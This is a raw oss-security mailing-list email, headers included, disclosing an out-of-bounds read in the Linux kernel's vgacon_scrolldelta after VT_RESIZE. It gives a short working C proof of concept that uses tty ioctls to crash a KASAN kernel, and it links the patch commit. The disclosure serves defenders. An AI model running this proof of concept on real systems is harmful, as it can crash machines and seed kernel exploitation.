X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["921" "Wednesday" "16" "September" "2020" "16:19:46" "+0800" "NopNop Nop" "nopitydays@gmail.com" "<CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>" "39" "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" nil nil nil "9" "2020091608:19:46" "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" (number mark "U       nopitydays@g Sep 16   39/921   " thread-indent "\"[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5280 invoked by uid 550); 16 Sep 2020 10:13:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 16216 invoked from network); 16 Sep 2020 08:20:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=HOTg6yDYzQLQcQDOHjzxJ1tr2FswNKzyqEttlIFrMxc=;
        b=sx8MmCg/r0ZYn7Z0gCOlBFX+Uui2CjpPn4I/jaHj+WYaZEeMQpFq6xOHizNqOAI4iT
         OnFzf3rkxBQrqD8zUA5Db4hCG1I9BPkCUQCWHvyDGQ6S0CbI4zEtyQ8Syt/VGa/K5YTO
         w0T+XxUFtQ30BoPHgiWKgFEPpJ3tj1Uau2uBbalQ2ay/++8YGCgkQ0hYKm/1MiwveBcP
         9yIeHGPBj5ar0UN1H9ODFnXq7qhe1lEnS6mqcaoEZn8Yz2mozBqtTnD+c9P0MOATHvEm
         MH8G0F/gGOw1/p/jJW76tpyk/3/4QxwWFa/esZnmOxv16jJbVHkp0kaxkrbt3+SB/cJ/
         xHJA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=HOTg6yDYzQLQcQDOHjzxJ1tr2FswNKzyqEttlIFrMxc=;
        b=ZAEXy/3oW7+vmm88uX+sQSa8PAKSZD5fqbOQnZmoWjDF0oDLEDs/Oivy96dUqIx9m5
         UiPBkI3usjTqFZ7VVuidYwOvvkWnA12+m1jRiZNYICaBZ506aUA4OUlEyiJbvJjBga1E
         78JP5LkIYuJFiC2XBTOAUkew/+3RjGfahfnF6GiNDZuhByTfKpvNlh6ksN3hD2BDa5mB
         pMuk7M9qZzmczMArmBCuAG7DJenoZgz/6/lGtcAh/U/Znzza17418Fq7azcEqOQ8Hjjy
         tvFJqQCtSYHB91Rk5e1iLXRm+aeWywPEZ9U4WH4GSv/R7eBMK2oy+ExkU2FexqitjMAo
         fSLA==
X-Gm-Message-State: AOAM5330htNamYI/8U106xKm+8LlpGQAi4bPAkYRpm3k/62mvZwvhcWs
	5zM9MLhrLcr/jwcziyrqeSJNDpJB2Ozv/azt4CnuQwLT2uI=
X-Google-Smtp-Source: ABdhPJygikWqa4OjeC6jHtUtJjyO13GvVqqnxmmWtce4a5S48FOqfdj1u1PukoWIw93WzusFHrYHSTPllOpFwlhIAC4=
X-Received: by 2002:adf:9e41:: with SMTP id v1mr27741251wre.60.1600244397316;
 Wed, 16 Sep 2020 01:19:57 -0700 (PDT)
MIME-Version: 1.0
From: NopNop Nop <nopitydays@gmail.com>
Date: Wed, 16 Sep 2020 16:19:46 +0800
Message-ID: <CA+-U7QDboXJEpHXNa5mk-pOyBbKw63t8WefV5cmr+Hi8KsWeOQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000db1c1f05af69eee1"
Subject: [oss-security] Linux Kernel: out-of-bounds reading in vgacon_scrolldelta

--000000000000db1c1f05af69eee1
Content-Type: text/plain; charset="UTF-8"

Hi,

We found a out-of-bounds reading in vgacon_scrolldelta. This BUG is caused
by "soff" being negative after VT_RESIZE.

Our PoC (panic with CONFIG_KASAN=y):

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>

int main(int argc, char** argv)
{
        int fd = open("/dev/tty1", O_RDWR, 0);

        unsigned short size[3] = {4, 0x254, 0};
        ioctl(fd, 0x5609, size);

        for (int i = 0; i < 110; i++) {
                write(fd, "\x0a", 1);
        }
        signed int args[3] = {13, -0x400, 0};
        ioctl(fd, 0x541c, args);
}

Here is the commit to patch this BUG:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=973c096f6a85e5b5f2a295126ba6928d9a6afd45

Regards,
Nop

--000000000000db1c1f05af69eee1--
